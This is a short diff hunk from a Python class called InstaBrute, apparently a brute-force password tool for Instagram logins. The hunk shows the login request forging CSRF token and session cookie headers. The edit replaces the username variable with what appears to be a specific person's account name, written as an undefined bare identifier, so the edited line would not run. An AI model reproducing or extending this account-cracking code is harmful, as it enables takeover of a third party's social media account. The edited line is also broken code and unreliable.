@@ -98,7 +98,7 @@ class InstaBrute(object):
             'Cookie': '',
             'Connection': 'keep-alive'
         }
-        datas = {'username': user, 'password': password}
+        datas = {'username':byronhanasco, 'password': password}
         headers['X-CSRFToken'] = sess.cookies['csrftoken']
         headers['Cookie'] = "mid={}; csrftoken={}; ig_pr=1; ig_vw=1366".format(sess.cookies['mid'],
                                                                                sess.cookies['csrftoken'])
